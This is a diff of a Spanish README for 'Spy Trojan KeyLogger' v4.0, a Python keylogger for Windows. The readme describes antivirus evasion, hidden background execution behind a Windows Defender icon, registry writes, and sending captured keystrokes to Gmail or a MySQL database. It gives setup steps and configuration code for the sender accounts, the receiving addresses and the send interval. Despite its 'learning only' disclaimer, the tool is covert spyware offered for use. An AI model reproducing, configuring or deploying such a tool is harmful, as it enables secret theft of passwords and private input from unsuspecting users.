@@ -1,23 +1,20 @@
 ````
-█▀ █▀█ █▄█   ▀█▀ █▀█ █▀█ ░░█ ▄▀█ █▄░█   █▄▀ █▀▀ █▄█ █░░ █▀█ █▀▀ █▀▀ █▀▀ █▀█
-▄█ █▀▀ ░█░   ░█░ █▀▄ █▄█ █▄█ █▀█ █░▀█   █░█ ██▄ ░█░ █▄▄ █▄█ █▄█ █▄█ ██▄ █▀▄ v4.0     
+█▀ █▀█ █▄█   ▀█▀ █▀█ █▀█   █ ▄▀█ █▄ █   █▄▀ █▀▀ █▄█ █   █▀█ █▀▀ █▀▀ █▀▀ █▀█
+▄█ █▀▀  █     █  █▀▄ █▄█ █▄█ █▀█ █ ▀█   █ █ ██▄  █  █▄▄ █▄█ █▄█ █▄█ ██▄ █▀▄ v4.0     
 ````
 ---
----
+# ¡Por favor! úserla con criterio y profesionalidad...
+## Información
 * __Nombre:__ `Spy Trojan KeyLogger`
-* __Documentación:__ `22/05/2020`
+* __Documentación:__ `24/05/2020`
 * __Versión:__ `4.0`
 * __Estado:__` Estable`
 * __Plataforma:__` Windows 7, 8.1 y 10`
 * __Lenguaje:__` Python 3.8`
 
+__¡ Nota importante !:__ Ésta herramienta tiene como único proposito general, el aprendizaje de ___"Seguridad en sistemas informáticos"___, el creador no se hace responsable por un posible mal uso de ésta herramienta. 
 
-__Nota importante:__ Esta herramienta tiene como proposito general y de uso exclusivo para aprendizaje, se creó como parte de un curso Online de hacking de __"Seguridad de sistemas informáticos"__, no me hago responsable de un posible mal uso de ésta herramienta.
 
-Las razones por las cuales existen los Keyloggers, tienen como fin la seguridad de una empresa ya sea que estén viendo qué está haciendo el personal, cómo interactúan sus personas en las computadoras o que los atacantes intenten obtener información confidencial, como información de inicio de sesión u otros datos confidenciales. Este programa simplemente toma cada pulsación de tecla ingresada en el teclado y luego envía el archivo de registro por correo electrónico cada 2 horas.
-
----
----
 # Carpeta Principal
 ![Archivos](https://i.imgur.com/PVN64Kv.png)
 - `Doc` = Documentación de como perzonalizar el keylogger `CustomKey.md`
@@ -25,6 +22,7 @@ Las razones por las cuales existen los Keyloggers, tienen como fin la seguridad 
 - `DataCompartir.txt`    = Pequeña descripción del keylogger
 - `Ejecutar.bat`    = Ejecuta el script - [para pruebas]
 - `icon.ico`    = Icono Windows Defender
+- `InstallRequirements.bat` = Instala las librerías necesarias en python3
 - `LICENCE` = Licencia 
 - `README.md`= Documentación
 - `version.txt` = Información detalla de conversión `.py` a `.exe`
@@ -33,7 +31,12 @@ Las razones por las cuales existen los Keyloggers, tienen como fin la seguridad 
 ---
 ---
 # Caracteristicas
-- __Indetectable Antivirus:__ Windows Defender `22/05/2020`, Avast, ESET NOD32
+- __Indetectable Antivirus:__ Windows Defender `24/05/2020`, Avast, ESET NOD32
+- __Envío por DB_MYSQL:__ Se enviarán los datos del registro mediante una base de datos MySQL, más información [Aquí]()
+
+    ![DataBase key](https://i.imgur.com/axhHVlF.png)
+
+
 - __Envío por Gmail:__ Envía el registro de teclas por Gmail en un `reg.k`.
 
   ![Correo ejemplo del Keylogger](https://i.imgur.com/HCyUK2M.png)
@@ -46,16 +49,16 @@ Las razones por las cuales existen los Keyloggers, tienen como fin la seguridad 
         return ["Recibe1@gmail.com", "Recibe2@hotmail.com", "Recibe3@yahoo.com"]   # MultiCorreo
         #return ["CorreoReceptor@gmail.com"]                                         #Monocorreo        
     ````
-- __Conexión a una base de datos MySQL:__ Se enviarán los datos del registro mediante una base de datos, más información [Aquí]()
-
-
 - __Verifica conexión a internet:__ El keylogger verifica si la computadora está conectada a internet, y si ese es el caso envía los datos, en caso contrario, no lo envía,
-- __Intervalo de tiempo personalizado:__ Usted puede elegir un intervalo de tiempo personalizado, en la cual desea recibir el registro de teclas. `No se recomienta que sea un intervalo muy pequeño, ya que el servidor de mensajería de google, bloqueará la cuenta por 1 día,  por eso el tiempo de intervalo de envío escogida es de 2 Horas, este tiempo transcurre desde el  inicio del script`
+- __Intervalo de tiempo personalizado:__ 
+    - __DATABASE:__ El tiempo recomendado es de 2 a 3 minutos.  [`Ésto se debe a un error todavía no solucionado en python que causa que no pueda envíar datos mayor a 200 caracteres.`]
+    - __GMAIL:__ El tiempo recomendado es de 1:30 a 2 horas mínimo. [`Sucede que Google suele bloquear la cuenta por horas cuando detecta una gran cantidad de correos envíados por día.`]
+
     ````py
     def timeSend(): # Tiempo de envío perzonalizado
         return 120    # Minutos                 <= Escoja su tiempo en minutos
     ````
-- __Obtención de datos a prueba de errores:__ En otros keylogger al momento de enviar el `reg.k`, éste proceso demora entre 3 a 5 segundos, y en ese transcurso de tiempo el keylogger no obtiene ninguna información de teclas oprimidas, en éste keylogger, ese error está solucionado.
+- __Envío del registro prueba de errores:__ En otros keylogger al momento de enviar el `reg.k`, éste proceso demora entre 3 a 5 segundos, y en ese transcurso de tiempo el keylogger no obtiene ninguna información de teclas oprimidas, en éste keylogger, ese error está solucionado.
 - __Segundo plano:__ Este keylogger, al ejecutarse en la linea de comando, sí mostrará una consola, solo por detalles de debuggeo, pero al ser compilada de `*.py` a `*.exe` el ejecutable resultante se ejecutará en segundo plano
 
     ![Segundo plano](https://i.imgur.com/DFAf2Tw.png)
@@ -95,18 +98,35 @@ El programa se repite 2 veces ya que ésta utiza 2 hilos de ejecución
 ---
 # Proceso de preparación:
 
-__NOTA:__ Como requisito mínimo para el aprendizaje de ésta herramienta es saber programar en __Python básico__.
+__NOTA:__ Como requisito mínimo para el aprendizaje de ésta herramienta es saber programar en __Python básico__ y en casó de que use la conexión a la base de datos, pues MySQL básico.
 
 Requerimiento de paquetes de `Python3.8`:
-- `import pynput`
-- `import getuser`
-- `import datetime`
-- `import os`
-- `import time`
-- `import yagmail`
-- `import socket`
-- `import threading`
-- `import pyinstaller`
+- `import pynput`   <== Obtiene los eventos de teclado.
+- `from pynput.keyboard import Key, Listener` <== Escucha eventos del teclado
+- `from getpass import getuser`  <== Obtiene el nombre del Usuario
+- `import datetime` <== Obtiene la Fecha, Horas, Minutos, y segundos actual
+- `import os`       <== Operaciones con archivos
+- `from winreg import *` <== Permite escribir en el registro de windows.
+- `import time`     <== Obtiene la Fecha, Horas, Minutos, y segundos actual.
+- `import yagmail`  <== Envía `reg.k` por Gmail
+- `import socket`   <== Verifica conexión a internet
+- `import pymysql`  <== Permite conectarnos a la base de datos
+- `import threading` <== Ejecución multihilos
+- `import pyinstaller` <== Convierte de `*.py` a `*.exe`
+
+NOTA: Bibliotecas no optimizadas! :'( 
+
+## Escoge [GMAIL] o [DataBase]:
+- Por ahora solo podemos escoger el envío del registro o bien por una conexión a una __Base de datos__ o por __Gmail__, no podemos escoger ambas.
+
+- Buscamos la siguiente función y escogemos [1 = DataBase] o [2 = Gmail]
+    ````py
+    def GMailOrDataBase():
+    return 1    # 1 = DataBase 
+                # 0 = Gmail
+                # (en las proximas actualizaciones , ambas a la vez)
+    ```` 
+
 
 ## Envió Mediante Gmail
 1. Es de suma urgencia habilitar el acceso a apps menos seguras de google, la cual lo puedes hacer desde éste [link](https://myaccount.google.com/lesssecureapps).  `En caso no lo habilites, el keylogger no podrá iniciar sesión en su Gmail`
@@ -115,28 +135,30 @@ Requerimiento de paquetes de `Python3.8`:
 3. Abra el archivo `WindowsDefender.py` en su editor de texto.
 4. Entre al codigo y busca la `ZONA CUSTOM BÁSICA` y modifique el `Correo primario` y el `Correo segundario`, luego rellene el o los `Correos que receptores`
 ````py
-# ************************************  FIN ZONA CUSTOM BÁSICA   *********************************
-
-# Correo de envío [Primaria] 
-def emailP():                   # <<== Cambia éste correo
-    return "correo1@gmail.com" 
+# ************ Zona Gmail ************* 
+def emailP():# Correo de envío [Primaria]                    
+    return "correo1@gmail.com"  # <<== Cambia éste correo
 def passP():                    # <<== Contraseña del correo
     return "contra1"
-# Correo de envío [Segundaria]     <=> Solo si hay algún problema de envío con el correo Principal
-def emailS():                   # <<== Cambia éste correo
-    return "correo2@gmail.com"
-def passS():                   # <<== Contraseña del correo 
-    return "pass2"
+def emailS():# Correo de envío [Segundaria]     <=> Solo si hay algún problema de envío con el correo Principal
+    return "correo2@gmail.com"  # <<== Cambia éste correo
+def passS():                   
+    return "pass2"              # <<== Contraseña del correo 
+
+def ReceiveE():#Correos que recibirán el registro de teclas.
+    #return ["Recibe1@gmail.com", "Recibe2@hotmail.com", "Recibe3@yahoo.com"]   # MultiCorreo
+    return ["CorreoReceptor@gmail.com"]                                         # MonoCorreo
+# ************ Fin Zona Gmail ************* 
+
+def GMailOrDataBase():
+    return 0    # 1 = DataBase 
+                # 0 = Gmail
+                # (en las proximas actualizaciones , ambas a la vez)
 
 def timeSend(): # Tiempo de envío perzonalizado
     return 120 #Minutos                 <= Escoja su tiempo en minutos
 
-#Correos que recibirán el registro de teclas.
-def ReceiveE():
-    #return ["Recibe1@gmail.com", "Recibe2@hotmail.com", "Recibe3@yahoo.com"]   # MultiCorreo
-    return ["CorreoReceptor@gmail.com"]                                         # MonoCorreo
 
-# ************************************  FIN ZONA CUSTOM BÁSICA   *********************************
 
 ````
 [Si usted desea modificar el keylogger lea la siguiente documentación aquí.](Doc/CustomKey.md)
